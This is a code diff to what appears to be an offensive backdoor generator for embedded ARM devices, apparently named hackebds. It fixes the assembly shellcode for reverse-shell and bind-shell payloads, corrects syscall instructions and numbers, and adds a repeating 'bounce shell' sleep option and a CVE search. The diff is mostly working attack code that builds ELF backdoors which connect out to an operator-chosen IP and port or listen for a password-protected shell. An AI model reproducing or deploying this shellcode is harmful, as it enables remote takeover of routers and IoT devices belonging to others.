@@ -616,31 +616,28 @@ def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	add r4,sp,#-0x1d
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -648,7 +645,7 @@ def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 
 	'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
@@ -692,9 +689,6 @@ def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
@@ -753,7 +747,7 @@ def armelv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	#print shellcode
 	#str(u8(handle_port[0])),str(u8(handle_port[1])
 	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
-	shellcode=asm(shellcode)[:-2]
+	shellcode=asm(shellcode)
 	ELF_data = make_elf(shellcode)
 	if filename==None:
 		log.info("waiting 3s")
@@ -1274,31 +1268,28 @@ def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	add r4,sp,#-0x1d
 	add r8,sp,#-0x20
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -1306,7 +1297,7 @@ def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
 		shellcode = '''
@@ -1351,31 +1342,29 @@ def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	add r8,sp,#-0x20
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
+
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
@@ -1383,7 +1372,7 @@ def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 	else:
 		log.info("now shell is only support sh and bash")
@@ -1411,7 +1400,7 @@ def armebv5_backdoor(shell_path ,reverse_ip,reverse_port, envp,filename=None):
 	#print shellcode
 	#str(u8(handle_port[0])),str(u8(handle_port[1])
 	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
-	shellcode=asm(shellcode)[:-2]
+	shellcode=asm(shellcode)
 	ELF_data = make_elf(shellcode)
 	if filename==None:
 		log.info("waiting 3s")
@@ -4324,17 +4313,14 @@ def armelv5_bind_shell(listen_port, passwd, filename=None):
 	add r8,sp,#-0x20
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	'''
 
 	shellcode += '''
 	mov  r0, #2
     mov  r1, #1
     eor  r2, r2 ,r2/* 0 (#0) */
-    /* call socket() */
-    mov r7, #SYS_socket /* 0x119 */
+    mov r7, #0xff /* 0x119 */
+    add r7,r7,0x1a
     svc  #0
 	'''
 
@@ -4343,15 +4329,18 @@ def armelv5_bind_shell(listen_port, passwd, filename=None):
 	shellcode +='''
 	mov  r1,sp
 	mov  r2,#0x10  
-	mov r7, 0x11a
+	mov r7,#0xff
+	add r7,r7,0x1b
 	svc #0
 	mov r0,r6
 	eor r1,r1
-	mov r7,#284
+	mov r7,#0xff
+	add r7,r7,29
 	svc #0
 	mov r0,r6
 	eor r2,r2
-	mov r7, 0x11d
+	mov r7, #0xff
+	add r7,r7,30
     svc #0
     mov r6,r0
 	mov r7,#0x20
@@ -4386,13 +4375,13 @@ def armelv5_bind_shell(listen_port, passwd, filename=None):
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov  r7,sp
 	ldr  r1,[r7]
 	'''
@@ -4410,7 +4399,7 @@ def armelv5_bind_shell(listen_port, passwd, filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 	shellcode = shellcode % ( passwd_len)
 
@@ -4535,9 +4524,6 @@ def armebv5_bind_shell(listen_port, passwd, filename=None):
 	add r8,sp,#-0x20
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	'''
 
 	shellcode += '''
@@ -4632,7 +4618,7 @@ def armebv5_bind_shell(listen_port, passwd, filename=None):
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 
 	shellcode += '''
@@ -4832,7 +4818,7 @@ def test1():
 '''
 
 def get_version():
-    return Fore.GREEN+"Version: 0.3.6"+Fore.RESET
+    return Fore.GREEN+"Version: 0.3.7"+Fore.RESET
 
 
 '''
@@ -5045,9 +5031,9 @@ def num_get_file_cmd(number, CMD_PATH,CMD, envp,filename):
 	return fun(CMD, CMD_PATH , envp, filename)
 
 
-def num_get_power_reverse_shell(num, shell_path ,reverse_ip, reverse_port, envp ,filename):
+def num_get_power_reverse_shell(num, shell_path ,reverse_ip, reverse_port, envp , sleep_time,filename):
 	fun = power_reverse_shell.get(num)
-	return fun(shell_path, reverse_ip, reverse_port, envp,filename)
+	return fun(shell_path, reverse_ip, reverse_port, envp, sleep_time,filename)
 
 def num_get_power_bind_shell(num, shell_path, listen_port, passwd, envp,filename):
 	fun = power_bind_shell_dic.get(num)
@@ -5086,16 +5072,20 @@ def main():
 	parser.add_argument('-shell', required=False, type=str,default="/bin/sh", help='cmd shell or execute file path')
 	parser.add_argument('-cmd', required=False, type=str,default=None, help='Commands executed')
 	parser.add_argument('-envp', required=False, type=str,default=None, help='Commands envp')
+	parser.add_argument('-sleep', required=False, type=int,default=5, help='the interval time in the continuous bounce shell, in seconds default is 5')
 	parser.add_argument('-encode', '--encode' ,action='store_true', help='encode backdoor')
 	parser.add_argument('-power', '--power' ,action='store_true',help='powerful reverse shell_file or bind_shell file')
 	parser.add_argument('-s', '--search' ,action='store_true',help='Basic information and POC of search device')
 	parser.add_argument('-l', '--list' ,action='store_true',help='print model information list')
 	parser.add_argument('-p', '--poc' ,action='store_true',help='generated model\'s POC file')
 	parser.add_argument('-v', '--version' ,action='version', version=get_version(), help='Display version')
+	parser.add_argument('-CVE', '--CVE', required=False, type=str, default=None, help='CVE ID')
 	parser.add_argument('-add', '--add_model', action='store_true', help='Add model tree\'s node')
 	flag_cve_info = 0
 	#@with_argparser(argparse)
 	args = parser.parse_args()
+	if(args.sleep <0 or args.sleep>36000000):
+		args.sleep = 5
 	log.info("Initialize data file")
 #try:
 	if (os.path.exists(model_choise.model_tree_info_dicname) == True):
@@ -5113,6 +5103,7 @@ def main():
 	#	print(e)
 	#	log.info("Initialization fail")
 	log.success("Initialization completed")
+	#model_choise.demo_test()
 	if (os.access("/tmp/hackebds_model_table", os.F_OK | os.R_OK | os.W_OK)):
 		pass
 	else:
@@ -5141,6 +5132,9 @@ def main():
 		if (args.search == True):
 			model_choise.search_model(args.model)
 			return
+	
+	if args.model == None and args.CVE!= None:
+		model_choise.search_CVE(args.CVE)
 
 	if (args.res == None ):
 		log.info("please use -h View Help")
@@ -5177,7 +5171,7 @@ def main():
 			flag_cve_info  = 1
 			args.arch = model_choise.model_to_arch(args.model)
 			log.success("found relationship {} ------>{}".format(args.model, args.arch))
-			model_choise.print_mmodel_dic()
+			#model_choise.print_mmodel_dic()
 		except:
 			log.info("There is no cross reference relationship locally, please set -arch building relationships, can be edited manually /tmp/hackebds_model_table")
 			return
@@ -5190,7 +5184,7 @@ def main():
 		if (args.reverse_ip!=None and args.reverse_port != None):
 			if (check_ip(args.reverse_ip)==True and check_port(args.reverse_port)==True):
 				if(args.power == True):
-					num_get_power_reverse_shell(arch_get_number(args.arch), args.shell,args.reverse_ip, args.reverse_port, args.envp ,args.filename)
+					num_get_power_reverse_shell(arch_get_number(args.arch), args.shell,args.reverse_ip, args.reverse_port, args.envp , hex(args.sleep) ,args.filename)
 					return
 				else:
 					try:
